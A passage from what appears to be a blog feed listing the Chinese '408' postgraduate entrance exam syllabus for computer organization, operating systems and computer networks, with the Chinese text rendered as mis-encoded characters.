<p>(ä¸‰)å¯»å€æ–¹å¼</p>
<p>(å››)æ•°æ®çš„å¯¹é½å’Œå¤§&#x2F;å°ç«¯å­˜æ”¾æ–¹å¼ </p>
<p>(äº”) CISC å’Œ RISC çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>(å…­)é«˜çº§è¯­è¨€ç¨‹å­—ä¸æœºå™¨çº§ä»£ç ä¹‹é—´çš„å¯¹åº” </p>
<p>1.ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.é€‰æ‹©ç»“æ„è¯­å¥çš„æœºå™¨çº§è¡¨ç¤º</p>
<p>3.å¾ªç¯ç»“æ„è¯­å¥çš„æœºå™¨çº§è¡¨ç¤º</p>
<p>4.è¿‡ç¨‹(å‡½æ•°)è°ƒç”¨å¯¹åº”çš„æœºå™¨çº§è¡¨ç¤º</p>
<h3 id="äº”ã€ä¸­å¤®å¤„ç†å™¨-CPU"><a href="#äº”ã€ä¸­å¤®å¤„ç†å™¨-CPU" class="headerlink" title="äº”ã€ä¸­å¤®å¤„ç†å™¨(CPU)"></a>äº”ã€ä¸­å¤®å¤„ç†å™¨(CPU)</h3><p>(ä¸€)CPU çš„åŠŸèƒ½å’ŒåŸºæœ¬ç»“æ„</p>
<p> (äºŒ)æŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ </p>
<p>(ä¸‰)æ•°æ®é€šè·¯çš„åŠŸèƒ½å’ŒåŸºæœ¬ç»“æ„ </p>
<p>(å››)æ§åˆ¶å™¨çš„åŠŸèƒ½å’Œå·¥ä½œåŸç†</p>
<p>1ã€ç¡¬å¸ƒçº¿æ§åˆ¶å™¨</p>
<p>2ã€å¾®ç¨‹åºæ§åˆ¶å™¨ å¾®ç¨‹åºã€å¾®æŒ‡ä»¤å’Œå¾®å‘½ä»¤;å¾®æŒ‡ä»¤çš„ç¼–ç æ–¹å¼;å¾®åœ°å€çš„å½¢å¼æ–¹å¼ã€‚</p>
<p>(äº”)å¼‚å¸¸å’Œä¸­æ–­æœºåˆ¶ </p>
<p>1.å¼‚å¸¸å’Œä¸­æ–­çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.å¼‚å¸¸å’Œä¸­æ–­çš„åˆ†ç±»</p>
<p>3.å¼‚å¸¸å’Œä¸­æ–­çš„æ£€æµ‹ä¸å“åº” </p>
<p>(å…­)æŒ‡ä»¤æµæ°´çº¿</p>
<p>1.æŒ‡ä»¤æµæ°´çº¿çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.æŒ‡ä»¤æµæ°´çº¿çš„åŸºæœ¬å®ç°</p>
<p>3.ç»“æ„å†’é™©ã€æ•°æ®å†’é™©å’Œæ§åˆ¶å†’é™©çš„å¤„ç†</p>
<p>4.è¶…æ ‡é‡å’ŒåŠ¨æ€æµæ°´çº¿çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>(ä¸ƒ)å¤šå¤„ç†å™¨åŸºæœ¬æ¦‚å¿µ</p>
<p>1.SISDã€SIMDã€MIMDã€å‘é‡å¤„ç†å™¨çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.ç¡¬ä»¶å¤šçº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ </p>
<p>3.å¤šæ ¸å¤„ç†å™¨(multi-core)çš„åŸºæœ¬æ¦‚å¿µ </p>
<p>4.å…±äº«å†…å­˜å¤šå¤„ç†å™¨(SMP)çš„åŸºæœ¬æ¦‚å¿µ</p>
<h3 id="å…­ã€æ€»çº¿å’Œè¾“å‡ºè¾“å‡ºç³»ç»Ÿ"><a href="#å…­ã€æ€»çº¿å’Œè¾“å‡ºè¾“å‡ºç³»ç»Ÿ" class="headerlink" title="å…­ã€æ€»çº¿å’Œè¾“å‡ºè¾“å‡ºç³»ç»Ÿ"></a>å…­ã€æ€»çº¿å’Œè¾“å‡ºè¾“å‡ºç³»ç»Ÿ</h3><p>(ä¸€)æ€»çº¿æ¦‚è¿°</p>
<p>1.æ€»çº¿çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.æ€»çº¿çš„ç»„æˆåŠæ€§èƒ½æŒ‡æ ‡</p>
<p>3.æ€»çº¿äº‹åŠ¡å’Œå®šæ—¶</p>
<p> (äºŒ)I&#x2F;O æ¥å£(I&#x2F;O æ§åˆ¶å™¨)</p>
<p>1.I&#x2F;O æ¥å£çš„åŠŸèƒ½å’ŒåŸºæœ¬ç»“æ„</p>
<p>2.I&#x2F;O ç«¯å£åŠå…¶ç¼–å€ </p>
<p>(ä¸‰)I&#x2F;O æ–¹å¼</p>
<p>1.ç¨‹åºæŸ¥è¯¢æ–¹å¼</p>
<p>2.ç¨‹åºä¸­æ–­æ–¹å¼ </p>
<p>ä¸­æ–­çš„åŸºæœ¬æ¦‚å¿µ;ä¸­æ–­å“åº”è¿‡ç¨‹;ä¸­æ–­å¤„ç†è¿‡ç¨‹;å¤šé‡ä¸­æ–­å’Œä¸­æ–­å±è”½çš„æ¦‚å¿µã€‚</p>
<p>3.DMA æ–¹å¼</p>
<p>DMA æ§åˆ¶å™¨çš„ç»„æˆï¼ŒDMA ä¼ é€è¿‡ç¨‹ã€‚</p>
<h2 id="ã€æ“ä½œç³»ç»Ÿã€‘"><a href="#ã€æ“ä½œç³»ç»Ÿã€‘" class="headerlink" title="ã€æ“ä½œç³»ç»Ÿã€‘"></a><strong>ã€æ“ä½œç³»ç»Ÿã€‘</strong></h2><p><strong>ã€è€ƒæŸ¥ç›®æ ‡ã€‘</strong></p>
<p>1.æŒæ¡æ“ä½œç³»ç»Ÿçš„åŸºæœ¬æ¦‚å¿µã€åŸºæœ¬åŸç†å’ŒåŸºæœ¬åŠŸèƒ½ï¼Œç†è§£æ“ä½œç³»ç»Ÿçš„æ•´ä½“è¿è¡Œè¿‡ç¨‹ã€‚</p>
<p>2.æŒæ¡æ“ä½œç³»ç»Ÿè¿›ç¨‹ã€å†…å­˜ã€æ–‡ä»¶å’Œ I&#x2F;O ç®¡ç†çš„ç­–ç•¥ã€ç®—æ³•ã€æœºåˆ¶ä»¥åŠç›¸ äº’å…³ç³»ã€‚</p>
<p>3.èƒ½å¤Ÿè¿ç”¨æ‰€å­¦çš„æ“ä½œç³»ç»ŸåŸç†ã€æ–¹æ³•ä¸æŠ€æœ¯åˆ†æé—®é¢˜å’Œè§£å†³é—®é¢˜ï¼Œå¹¶èƒ½åˆ© ç”¨ C è¯­è¨€æè¿°ç›¸å…³ç®—æ³•ã€‚</p>
<h3 id="ä¸€ã€æ“ä½œç³»ç»Ÿæ¦‚è¿°"><a href="#ä¸€ã€æ“ä½œç³»ç»Ÿæ¦‚è¿°" class="headerlink" title="ä¸€ã€æ“ä½œç³»ç»Ÿæ¦‚è¿°"></a>ä¸€ã€æ“ä½œç³»ç»Ÿæ¦‚è¿°</h3><p>(ä¸€)æ“ä½œç³»ç»Ÿçš„åŸºæœ¬æ¦‚å¿µ</p>
<p> (äºŒ)æ“ä½œç³»ç»Ÿçš„å‘å±•</p>
<p>(ä¸‰)ç¨‹åºè¿è¡Œç¯å¢ƒ</p>
<p>1.CPU è¿è¡Œæ¨¡å¼ å†…æ ¸æ¨¡å¼ï¼Œç”¨æˆ·æ¨¡å¼ã€‚</p>
<p>2.ä¸­æ–­å’Œå¼‚å¸¸çš„å¤„ç†</p>
<p>3.ç³»ç»Ÿè°ƒç”¨</p>
<p>4.ç¨‹åºçš„é“¾æ¥ä¸è£…å…¥</p>
<p>5.ç¨‹åºè¿è¡Œæ—¶å†…å­˜æ˜ åƒä¸åœ°å€ç©ºé—´</p>
<p> (å››)æ“ä½œç³»ç»Ÿç»“æ„</p>
<p>åˆ†å±‚ï¼Œæ¨¡å—åŒ–ï¼Œå®å†…æ ¸ï¼Œå¾®å†…æ ¸ï¼Œå¤–æ ¸ã€‚</p>
<p> (äº”)æ“ä½œç³»ç»Ÿå¼•å¯¼</p>
<p>(å…­)è™šæ‹Ÿæœº</p>
<h3 id="äºŒã€è¿›ç¨‹ç®¡ç†"><a href="#äºŒã€è¿›ç¨‹ç®¡ç†" class="headerlink" title="äºŒã€è¿›ç¨‹ç®¡ç†"></a>äºŒã€è¿›ç¨‹ç®¡ç†</h3><p>(ä¸€)è¿›ç¨‹ä¸çº¿ç¨‹</p>
<p>1.è¿›ç¨‹æ¦‚å¿µ</p>
<p>2.è¿›ç¨‹çš„çŠ¶æ€ä¸è½¬æ¢</p>
<p>3.çº¿ç¨‹çš„å®ç° å†…æ ¸æ”¯æŒçš„çº¿ç¨‹ï¼Œçº¿ç¨‹åº“æ”¯æŒçš„çº¿ç¨‹ã€‚</p>
<p>4.è¿›ç¨‹ä¸çº¿ç¨‹çš„ç»„ç»‡ä¸æ§åˆ¶</p>
<p>5.è¿›ç¨‹é—´é€šä¿¡ å…±äº«å†…å­˜ï¼Œæ¶ˆæ¯ä¼ é€’ï¼Œç®¡é“ã€‚</p>
<p>(äºŒ)CPU è°ƒåº¦ä¸ä¸Šä¸‹æ–‡åˆ‡æ¢ </p>
<p>1.è°ƒåº¦çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.è°ƒåº¦çš„ç›®æ ‡</p>
<p>3.è°ƒåº¦çš„å®ç° è°ƒåº¦å™¨&#x2F;è°ƒåº¦ç¨‹åº(scheduler)ï¼Œè°ƒåº¦çš„æ—¶æœºä¸è°ƒåº¦æ–¹å¼(æŠ¢å å¼&#x2F;éæŠ¢å å¼)ï¼Œé—²é€›è¿›ç¨‹ï¼Œå†…æ ¸çº§çº¿ç¨‹ä¸ç”¨æˆ·çº§çº¿ç¨‹è°ƒåº¦ã€‚</p>
<p>4.å…¸å‹è°ƒåº¦ç®—æ³•</p>
<p>å…ˆæ¥å…ˆæœåŠ¡è°ƒåº¦ç®—æ³•; çŸ­ä½œä¸š(çŸ­è¿›ç¨‹ã€çŸ­çº¿ç¨‹)ä¼˜å…ˆè°ƒåº¦ç®—æ³•; æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•;ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•; é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•; å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•ã€‚</p>
<p>5.ä¸Šä¸‹æ–‡åŠå…¶åˆ‡æ¢æœºåˆ¶</p>
<p>(ä¸‰)åŒæ­¥ä¸äº’æ–¥</p>
<p>1.è¿›ç¨‹åŒæ­¥çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.å®ç°ä¸´ç•ŒåŒºäº’æ–¥çš„åŸºæœ¬æ–¹æ³• è½¯ä»¶å®ç°æ–¹æ³•;ç¡¬ä»¶å®ç°æ–¹æ³•ã€‚</p>
<p>3.é”</p>
<p>4.ä¿¡å·é‡</p>
<p>5.æ¡ä»¶å˜é‡</p>
<p>6.ç»å…¸åŒæ­¥é—®é¢˜</p>
<p>ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜;è¯»è€…-å†™è€…é—®é¢˜;å“²å­¦å®¶è¿›é¤é—®é¢˜ã€‚</p>
<p>(å››)æ­»é”</p>
<p>1.æ­»é”çš„æ¦‚å¿µ</p>
<p>2.æ­»é”é¢„é˜²</p>
<p>3.æ­»é”é¿å…</p>
<p>4.æ­»é”æ£€æµ‹å’Œè§£é™¤</p>
<h3 id="ä¸‰ã€å†…å­˜ç®¡ç†"><a href="#ä¸‰ã€å†…å­˜ç®¡ç†" class="headerlink" title="ä¸‰ã€å†…å­˜ç®¡ç†"></a>ä¸‰ã€å†…å­˜ç®¡ç†</h3><p>(ä¸€)å†…å­˜ç®¡ç†åŸºç¡€</p>
<p>1.å†…å­˜ç®¡ç†çš„åŸºæœ¬æ¦‚å¿µ ç¨‹åºè£…å…¥ä¸é“¾æ¥;é€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€ç©ºé—´;å†…å­˜ä¿æŠ¤ã€‚å†…å­˜åˆ†é…ä¸å›æ”¶</p>
<p>2.è¿ç»­åˆ†é…ç®¡ç†æ–¹å¼</p>
<p>3.åˆ†é¡µç®¡ç†æ–¹å¼</p>
<p>4.åˆ†æ®µç®¡ç†æ–¹å¼</p>
<p>5.æ®µé¡µå¼ç®¡ç†æ–¹å¼ã€‚</p>
<p> (äºŒ)è™šæ‹Ÿå†…å­˜ç®¡ç†</p>
<p>1.è™šæ‹Ÿå†…å­˜åŸºæœ¬æ¦‚å¿µ</p>
<p>2.è¯·æ±‚åˆ†é¡µç®¡ç†æ–¹å¼</p>
<p>3.é¡µæ¡†åˆ†é…</p>
<p>4.é¡µé¢ç½®æ¢ç®—æ³• æœ€ä½³ç½®æ¢ç®—æ³•(OPT);å…ˆè¿›å…ˆå‡ºç½®æ¢ç®—æ³•(FIFO);æœ€è¿‘æœ€å°‘ä½¿ç”¨ç½®æ¢ç®—æ³•</p>
<p>(LRU);æ—¶é’Ÿç½®æ¢ç®—æ³•(CLOCK)ã€‚ </p>
<p>5.å†…å­˜æ˜ å°„æ–‡ä»¶(Memory-Mapped Flies)</p>
<p>6.è™šæ‹Ÿå­˜å‚¨å™¨æ€§èƒ½çš„å½±å“å› ç´ åŠæ”¹è¿›æ–¹æ³•</p>
<h3 id="å››ã€æ–‡ä»¶ç®¡ç†"><a href="#å››ã€æ–‡ä»¶ç®¡ç†" class="headerlink" title="å››ã€æ–‡ä»¶ç®¡ç†"></a>å››ã€æ–‡ä»¶ç®¡ç†</h3><p>(ä¸€)æ–‡ä»¶ç³»ç»ŸåŸºç¡€</p>
<p>1.æ–‡ä»¶æ¦‚å¿µ</p>
<p>2.æ–‡ä»¶å…ƒæ•°æ®å’Œç´¢å¼•èŠ‚ç‚¹</p>
<p>3.æ–‡ä»¶çš„æ“ä½œ å»ºç«‹ï¼Œåˆ é™¤ï¼Œæ‰“å¼€ï¼Œå…³é—­ï¼Œè¯»ï¼Œå†™ã€‚</p>
<p> 4.æ–‡ä»¶å…±äº«</p>
<p>5.æ–‡ä»¶çš„é€»è¾‘ç»“æ„</p>
<p>6.æ–‡ä»¶çš„ç‰©ç†ç»“æ„</p>
<p> (äºŒ)ç›®å½•</p>
<p>1.ç›®å½•çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.æ ‘å½¢ç›®å½•</p>
<p>3.ç›®å½•çš„æ“ä½œ</p>
<p>4.ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥</p>
<p>(ä¸‰)æ–‡ä»¶ç³»ç»Ÿ</p>
<p>1.æ–‡ä»¶ç³»ç»Ÿçš„å…¨å±€ç»“æ„(layout) æ–‡ä»¶ç³»ç»Ÿåœ¨å¤–å­˜ä¸­çš„ç»“æ„ï¼Œæ–‡ä»¶ç³»ç»Ÿåœ¨å†…å­˜ä¸­çš„ç»“æ„ã€‚</p>
<p>2.å¤–å­˜ç©ºé—²ç©ºé—´ç®¡ç†æ–¹æ³•</p>
<p>3.è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</p>
<p>4.æ–‡ä»¶ç³»ç»ŸæŒ‚è½½(mounting)</p>
<h3 id="äº”ã€è¾“å…¥è¾“å‡º-I-x2F-O-ç®¡ç†"><a href="#äº”ã€è¾“å…¥è¾“å‡º-I-x2F-O-ç®¡ç†" class="headerlink" title="äº”ã€è¾“å…¥è¾“å‡º(I&#x2F;O)ç®¡ç†"></a>äº”ã€è¾“å…¥è¾“å‡º(I&#x2F;O)ç®¡ç†</h3><p>(ä¸€)1&#x2F;O ç®¡ç†åŸºç¡€</p>
<p>1.è®¾å¤‡</p>
<p>è®¾å¤‡çš„åŸºæœ¬æ¦‚å¿µï¼Œè®¾å¤‡çš„åˆ†ç±»ï¼ŒI&#x2F;O æ¥å£ï¼ŒI&#x2F;O ç«¯å£ã€‚ </p>
<ol start="2">
<li>I&#x2F;O æ§åˆ¶æ–¹å¼</li>
</ol>
<p>è½®è¯¢æ–¹å¼ï¼Œä¸­æ–­æ–¹å¼ï¼ŒDMA æ–¹å¼ã€‚ </p>
<ol start="3">
<li>I&#x2F;O è½¯ä»¶å±‚æ¬¡ç»“æ„</li>
</ol>
<p>ä¸­æ–­å¤„ç†ç¨‹åºï¼Œé©±åŠ¨ç¨‹åº,è®¾å¤‡ç‹¬ç«‹è½¯ä»¶ï¼Œç”¨æˆ·å±‚ I&#x2F;O è½¯ä»¶ã€‚ </p>
<p>4.è¾“å…¥è¾“å‡ºåº”ç”¨ç¨‹åºæ¥å£ å­—ç¬¦è®¾å¤‡æ¥å£ï¼Œå—è®¾å¤‡æ¥å£ï¼Œç½‘ç»œè®¾å¤‡æ¥å£ï¼Œé˜»å¡&#x2F;éé˜»å¡ I&#x2F;Oã€‚</p>
<p>(äºŒ)è®¾å¤‡ç‹¬ç«‹è½¯ä»¶</p>
<p>1.ç¼“å†²åŒºç®¡ç†</p>
<p>2.è®¾å¤‡åˆ†é…ä¸å›æ”¶</p>
<p>3.å‡è„±æœºæŠ€æœ¯(SPOOLing)</p>
<p>4.è®¾å¤‡é©±åŠ¨ç¨‹åºæ¥å£ </p>
<p>(ä¸‰)å¤–å­˜ç®¡ç†</p>
<p>1.ç£ç›˜ ç£ç›˜ç»“æ„ï¼Œæ ¼å¼åŒ–ï¼Œåˆ†åŒºï¼Œç£ç›˜è°ƒåº¦æ–¹æ³•ã€‚ </p>
<p>2.å›ºæ€ç¡¬ç›˜</p>
<p>è¯»å†™æ€§èƒ½ç‰¹æ€§ï¼Œç£¨æŸå‡è¡¡ã€‚</p>
<h2 id="ã€è®¡ç®—æœºç½‘ç»œã€‘"><a href="#ã€è®¡ç®—æœºç½‘ç»œã€‘" class="headerlink" title="ã€è®¡ç®—æœºç½‘ç»œã€‘"></a><strong>ã€è®¡ç®—æœºç½‘ç»œã€‘</strong></h2><p><strong>ã€è€ƒæŸ¥ç›®æ ‡ã€‘</strong></p>
<p>1.æŒæ¡è®¡ç®—æœºç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µã€åŸºæœ¬åŸç†å’ŒåŸºæœ¬æ–¹æ³•ã€‚</p>
<p>2.æŒæ¡è®¡ç®—æœºç½‘ç»œçš„ä½“ç³»ç»“æ„å’Œå…¸å‹ç½‘ç»œåè®®ï¼Œäº†è§£å…¸å‹ç½‘ç»œè®¾å¤‡çš„ç»„æˆå’Œç‰¹ ç‚¹ï¼Œç†è§£å…¸å‹ç½‘ç»œè®¾å¤‡çš„å·¥ä½œåŸç†ã€‚</p>
<p>3.èƒ½å¤Ÿè¿ç”¨è®¡ç®—æœºç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µã€åŸºæœ¬åŸç†å’ŒåŸºæœ¬æ–¹æ³•è¿›è¡Œç½‘ç»œç³»ç»Ÿçš„åˆ†æã€ è®¾è®¡å’Œåº”ç”¨ã€‚</p>
<h3 id="ä¸€ã€è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„"><a href="#ä¸€ã€è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„" class="headerlink" title="ä¸€ã€è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„"></a>ä¸€ã€è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„</h3><p> (ä¸€)è®¡ç®—æœºç½‘ç»œæ¦‚è¿°</p>
<p>1.è®¡ç®—æœºç½‘ç»œçš„æ¦‚å¿µã€ç»„æˆä¸åŠŸèƒ½</p>
<p>2.è®¡ç®—æœºç½‘ç»œçš„åˆ†ç±»</p>
<p>3.è®¡ç®—æœºç½‘ç»œä¸»è¦æ€§èƒ½æŒ‡æ ‡</p>
<p> (äºŒ)è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„ä¸å‚è€ƒæ¨¡å‹</p>
<p>1.è®¡ç®—æœºç½‘ç»œåˆ†å±‚ç»“æ„</p>
<p>2.è®¡ç®—æœºç½‘ç»œåè®®ã€æ¥å£ã€æœåŠ¡ç­‰æ¦‚å¿µ</p>
<p>3.ISO&#x2F;OSI å‚è€ƒæ¨¡å‹å’Œ TCP&#x2F;IP æ¨¡å‹</p>
<h3 id="äºŒã€ç‰©ç†å±‚"><a href="#äºŒã€ç‰©ç†å±‚" class="headerlink" title="äºŒã€ç‰©ç†å±‚"></a>äºŒã€ç‰©ç†å±‚</h3><p>(ä¸€)é€šä¿¡åŸºç¡€ </p>
<p>1.ä¿¡é“ã€ä¿¡å·ã€å®½å¸¦ã€ç å…ƒã€æ³¢ç‰¹ã€é€Ÿç‡ã€ä¿¡æºä¸ä¿¡å®¿ç­‰åŸºæœ¬æ¦‚å¿µ</p>
<p>2.å¥ˆå¥æ–¯ç‰¹å®šç†ä¸é¦™å†œå®šç†</p>
<p>3.ç¼–ç ä¸è°ƒåˆ¶</p>
<p>4.ç”µè·¯äº¤æ¢ã€æŠ¥æ–‡äº¤æ¢ä¸åˆ†ç»„äº¤æ¢</p>
<p>5.æ•°æ®æŠ¥ä¸è™šç”µè·¯</p>
<p>(äºŒ)ä¼ è¾“ä»‹è´¨</p>
<p>1.åŒç»çº¿ã€åŒè½´ç”µç¼†ã€å…‰çº¤ä¸æ— çº¿ä¼ è¾“ä»‹è´¨</p>
<p>2.ç‰©ç†å±‚æ¥å£çš„ç‰¹æ€§</p>
<p> (ä¸‰)ç‰©ç†å±‚è®¾å¤‡</p>
<p>1.ä¸­ç»§å™¨</p>
<p>2.é›†çº¿å™¨</p>
<h3 id="ä¸‰ã€æ•°æ®é“¾è·¯å±‚"><a href="#ä¸‰ã€æ•°æ®é“¾è·¯å±‚" class="headerlink" title="ä¸‰ã€æ•°æ®é“¾è·¯å±‚"></a>ä¸‰ã€æ•°æ®é“¾è·¯å±‚</h3><p>(ä¸€)æ•°æ®é“¾è·¯å±‚çš„åŠŸèƒ½</p>
<p>(äºŒ)ç»„å¸§</p>
<p>(ä¸‰)å·®é”™æ§åˆ¶</p>
<p>1.æ£€é”™ç¼–ç </p>
<p>2.çº é”™ç¼–ç </p>
<p> (å››)æµé‡æ§åˆ¶ä¸å¯é ä¼ è¾“æœºåˆ¶</p>
<p>1.æµé‡æ§åˆ¶ã€å¯é ä¼ è¾“ä¸æ»‘è½®çª—å£æœºåˆ¶</p>
<p>2.åœæ­¢-ç­‰å¾…åè®®</p>
<p>3.åé€€ N å¸§åè®®(GBN)</p>
<p>4.é€‰æ‹©é‡ä¼ åè®®(SR)</p>
<p> (äº”)ä»‹è´¨è®¿é—®æ§åˆ¶</p>
<p>1.ä¿¡é“åˆ’åˆ†</p>
<p>é¢‘åˆ†å¤šè·¯å¤ç”¨ã€æ—¶åˆ†å¤šè·¯å¤ç”¨ã€æ³¢åˆ†å¤šè·¯å¤ç”¨ã€ç åˆ†å¤šè·¯å¤ç”¨çš„æ¦‚å¿µå’ŒåŸºæœ¬åŸç†ã€‚</p>
<p>2.éšå³è®¿é—®</p>
<p>ALOHA åè®®;CSMA åè®®;CSMA&#x2F;CD åè®®;CSMA&#x2F;CA åè®®ã€‚</p>
<p> 3.è½®è¯¢è®¿é—®</p>
<p>ä»¤ç‰Œä¼ é€’åè®®</p>
<p> (å…­)å±€åŸŸç½‘</p>
<p>1.å±€åŸŸç½‘çš„åŸºæœ¬æ¦‚å¿µä¸ä½“ç³»ç»“æ„</p>
<p>2.ä»¥å¤ªç½‘ä¸ IEEE 802.3</p>
<p>3.IEEE 802.11</p>
<p>4.VLAN åŸºæœ¬æ¦‚å¿µä¸åŸºæœ¬åŸç†</p>
<p>(ä¸ƒ)å¹¿åŸŸç½‘</p>
<p>1.å¹¿åŸŸç½‘çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.PPP åè®®</p>
<p>(å…«)æ•°æ®é“¾è·¯å±‚è®¾å¤‡</p>
<p> 1.ä»¥å¤ªç½‘äº¤æ¢æœºåŠå…¶å·¥ä½œåŸç†ã€‚</p>
<h3 id="å››ã€ç½‘ç»œå±‚"><a href="#å››ã€ç½‘ç»œå±‚" class="headerlink" title="å››ã€ç½‘ç»œå±‚"></a>å››ã€ç½‘ç»œå±‚</h3><p>(ä¸€)ç½‘ç»œå±‚çš„åŠŸèƒ½</p>
<p>1.å¼‚æ„ç½‘ç»œäº’è”</p>
<p>2.è·¯ç”±ä¸è½¬å‘</p>
<p>3.SDN åŸºæœ¬æ¦‚å¿µ</p>
<p>4.æ‹¥å¡æ§åˆ¶</p>
<p>(äºŒ)è·¯ç”±ç®—æ³•</p>
<p>1.é™æ€è·¯ç”±ä¸åŠ¨æ€è·¯ç”±</p>
<p>2.è·ç¦»-å‘é‡è·¯ç”±ç®—æ³•</p>
<p>3.é“¾è·¯çŠ¶æ€è·¯ç”±ç®—æ³•</p>
<p>4.å±‚æ¬¡è·¯ç”±</p>
<p> (ä¸‰)IPv4</p>
<p>1.IPv4 åˆ†ç»„</p>
<p>2.IPv4 åœ°å€ä¸ NAT</p>
<p>3.å­ç½‘åˆ’åˆ†ä¸å­ç½‘æ©ç ã€CIDR</p>
<p>4.ARP åè®®ã€DHCP åè®®ä¸ ICMP åè®®</p>
<p> (å››)IPv6</p>
<p>1.IPv6 çš„ä¸»è¦ç‰¹ç‚¹</p>
<p>2.IPv6 åœ°å€</p>
<p> (äº”)è·¯ç”±åè®®</p>
<p>1.è‡ªæ²»ç³»ç»Ÿ</p>
<p>2.åŸŸå†…è·¯ç”±ä¸åŸŸé—´è·¯ç”±</p>
<p>3.RIP è·¯ç”±åè®®</p>
<p>4.OSPF è·¯ç”±åè®®</p>
<p>5.BGP è·¯ç”±åè®®</p>
<p> (å…­)IP ç»„æ’­</p>
<p>1.ç»„æ’­çš„æ¦‚å¿µ</p>
<p>2.IP ç»„æ’­åœ°å€</p>
<p> (ä¸ƒ)ç§»åŠ¨ IP</p>
<p>1.ç§»åŠ¨ IP çš„æ¦‚å¿µ</p>
<p>2.ç§»åŠ¨ IP çš„é€šä¿¡è¿‡ç¨‹</p>
<p>(å…«)ç½‘ç»œå±‚è®¾å¤‡</p>
<p>1.è·¯ç”±å™¨çš„ç»„æˆå’ŒåŠŸèƒ½</p>
<p>2.è·¯ç”±è¡¨ä¸è·¯ç”±è½¬å‘</p>
<h3 id="äº”ã€ä¼ è¾“å±‚"><a href="#äº”ã€ä¼ è¾“å±‚" class="headerlink" title="äº”ã€ä¼ è¾“å±‚"></a>äº”ã€ä¼ è¾“å±‚</h3><p>(ä¸€)ä¼ è¾“å±‚æä¾›çš„æœåŠ¡</p>
<p> 1.ä¼ è¾“å±‚çš„åŠŸèƒ½</p>
<p>2.ä¼ è¾“å±‚å¯»å€ä¸ç«¯å£</p>
<p>3.æ— è¿æ¥æœåŠ¡ä¸é¢å‘è¿æ¥æœåŠ¡</p>
<p>(äºŒ)UDP åè®®</p>
<p>1.UDP æ•°æ®æŠ¥</p>
<p>2.UDP æ ¡éªŒ</p>
<p>(ä¸‰)TCP åè®®</p>
<p>1.TCP æ®µ</p>
<p>2.TCP è¿æ¥ç®¡ç†</p>
<p>3.TCP å¯é ä¼ è¾“</p>
<p>4.TCP æµé‡æ§åˆ¶ä¸æ‹¥å¡æ§åˆ¶</p>
<h3 id="å…­ã€åº”ç”¨å±‚"><a href="#å…­ã€åº”ç”¨å±‚" class="headerlink" title="å…­ã€åº”ç”¨å±‚"></a>å…­ã€åº”ç”¨å±‚</h3><p>(ä¸€)ç½‘ç»œåº”ç”¨æ¨¡å‹  çˆ±ä½ å“Ÿ</p>
<p>1.å®¢æˆ·&#x2F;æœåŠ¡å™¨æ¨¡å‹</p>
<p>2.P2P æ¨¡å‹</p>
<p>(äºŒ)DNS ç³»ç»Ÿ</p>
<p>1.å±‚æ¬¡åŸŸåç©ºé—´</p>
<p>2.åŸŸåæœåŠ¡å™¨</p>
<p>3.åŸŸåè§£æè¿‡ç¨‹</p>
<p>(ä¸‰)FTP</p>
<p>1.FTP åè®®çš„å·¥ä½œåŸç†</p>
<p>2.æ§åˆ¶è¿æ¥ä¸æ•°æ®è¿æ¥</p>
<p>(å››)ç”µå­é‚®ä»¶</p>
<p>1.ç”µå­é‚®ä»¶ç³»ç»Ÿçš„ç»„æˆç»“æ„</p>
<p>2.ç”µå­é‚®ä»¶æ ¼å¼ä¸ MIME</p>
<p>3.SMTP åè®®ä¸ POP3 åè®®</p>
<p>(äº”)WWW</p>
<p>1.WWW çš„æ¦‚å¿µä¸ç»„æˆç»“æ„</p>
<p>2.HTTP åè®®</p>
<blockquote>
<p>çˆ±ä½ å“Ÿ</p>
</blockquote>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>è€ƒç ”</tag>
        <tag>408</tag>
        <tag>è€ƒçº²</tag>
      </tags>
  </entry>
  <entry>
    <title>æ“ä½œç³»ç»Ÿ</title>
    <url>/2021/09/21/%E8%80%83%E7%A0%94/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
